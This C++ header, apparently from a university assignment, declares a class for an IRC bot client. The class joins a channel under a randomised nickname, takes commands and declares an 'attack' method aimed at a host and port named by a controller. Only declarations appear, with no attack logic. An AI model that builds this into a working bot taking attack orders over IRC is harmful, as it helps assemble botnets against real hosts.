#pragma once

/*
#define DEBUG
//*/

// Includes
#include <string.h>
#include <cstdlib>
#include <vector>
#include <stdio.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <iterator>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

// Namespaces
using namespace std;

// Class: connection
// Desc: Handles Commection commands to the IRC server
// Written by: James Cote
// ID: 10146559
// Tutorial: T01
class connection
{
	public: // Singleton implementation.
		connection( const string& sServerName, int iPort, const string& sChannel, string& sErrMsg );
		~connection();

		// Message Handling
		void connectToServer( const string& sNamePrefix );
		void splitString( string sInput, char delim, vector<string>& sOutput );
		bool attack( const string& sHostName, int iPort, const string& sControllerName );
		
		// Message Sending/Receiving
		int getNextLine( string& sNextLine );
		int Socket_Write( string sMsg, int iSocket = -1 );
		int issueCommand( const string& sCommand );
		void flushConnection();

		// Getter/Setters
		bool isConnected() { return m_bConnected; }
		const string* const getNickname() { return &m_sNickName; }

		// Error handler.
		inline int error( const string& sMsg )
		{
			fprintf( stderr, sMsg.c_str() );
			fprintf( stderr, "Error: %s\n", strerror( errno ) );
			return -1;
		}

	private:
		// Private Variables
		int m_iConnectedSocket, m_iPort;
		struct sockaddr_in m_sClientAddr;
		string m_sHostName, m_sChannel, m_sNickName, m_sNickPrefix;
		bool m_bConnected;
		stringstream m_sStream;
		int m_iCounter;

		// Private Functions
		// Connects a Socket for Reading and writing.
		bool connectSocket( int& iSocket, struct sockaddr_in& sAddr, 
							const string& sHostName, int iPort, string& sErrMsg );

		// Generates a random name, given a prefix and a number of digits to randomize
		void genRandomName( const string& sPrefix, int iNumRandomDigits, string& sRetName );

		// Read from Socket, encapsulated for buffered reads.
		int Socket_Read( char* pBuffer, int iBuffSize );

		// Forces the connection to reconnect to the IRC server if an error occurs in reading or writing.
		inline void forceReconnect()
		{
			string sErrMsg;
			close( m_iConnectedSocket );
			m_bConnected = connectSocket( m_iConnectedSocket, m_sClientAddr, m_sHostName, m_iPort, sErrMsg );
			connectToServer( m_sNickPrefix );
		}
};
